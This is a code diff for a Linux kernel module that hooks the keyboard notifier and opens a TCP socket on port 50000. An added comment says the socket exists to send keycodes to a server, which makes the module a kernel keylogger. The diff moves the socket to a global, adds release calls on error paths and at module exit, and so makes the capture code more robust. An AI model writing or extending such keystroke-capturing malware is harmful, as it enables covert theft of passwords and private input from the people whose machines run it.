@@ -6,6 +6,8 @@
 
 #define PORT 50000
 
+static struct socket *sock; // Socket to send keycodes to the server
+
 static int keyboard_callback(struct notifier_block *nblock, unsigned long code, void *_param)
 {
     struct keyboard_notifier_param *param = _param;
@@ -32,12 +34,12 @@ static struct notifier_block keyboard_nb = {
 };
 
 // Creates socket
-static int create_socket(struct socket **sock) {
+static int create_socket(struct socket **fsock) {
     struct sockaddr_in server_addr;
     int ret;
 
     // Create TCP socket
-    ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, sock);
+    ret = sock_create_kern(&init_net, PF_INET, SOCK_STREAM, IPPROTO_TCP, fsock);
     if (ret < 0) {
         printk(KERN_ERR "failed to create socket\n");
         return ret;
@@ -52,25 +54,28 @@ static int create_socket(struct socket **sock) {
 
     // Bind socket to server address
     // ret = kernel_bind(sock, (struct sockaddr*)&saddr, sizeof(saddr));
-    ret = (*sock)->ops->bind(*sock, (struct sockaddr *)&server_addr, sizeof(server_addr));
+    ret = (*fsock)->ops->bind(*fsock, (struct sockaddr *)&server_addr, sizeof(server_addr));
     if (ret < 0) {
         printk(KERN_ERR "failed to bind socket\n");
+        (*fsock)->ops->release(*fsock);
         return ret;
     }
 
     // Listen for incoming connections
     // ret = kernel_listen(sock, 1);
-    ret = (*sock)->ops->listen(*sock, 1);
+    ret = (*fsock)->ops->listen(*fsock, 1);
     if (ret < 0) {
         printk(KERN_ERR "failed to listen on socket\n");
+        (*fsock)->ops->release(*fsock);
         return ret;
     }
 
     // Accept incoming connections
     // ret = kernel_accept(sock, &client_sock, 0);
-    ret = (*sock)->ops->accept(*sock, &client_sock, 0);
+    ret = (*fsock)->ops->accept(*fsock, &client_sock, 0);
     if (ret < 0) {
         printk(KERN_ERR "failed to accept connection\n");
+        (*fsock)->ops->release(*fsock);
         return ret;
     }
 
@@ -79,9 +84,7 @@ static int create_socket(struct socket **sock) {
 }
 
 static int __init keyboard_module_init(void)
-{
-    struct socket *sock;
-    
+{ 
     // Create server
     create_socket(&sock);
 
@@ -95,6 +98,9 @@ static void __exit keyboard_module_exit(void)
 {
     // Unregister the keyboard notifier
     unregister_keyboard_notifier(&keyboard_nb);
+
+    // Release socket
+    sock->ops->release(sock);
 }
 
 module_init(keyboard_module_init);
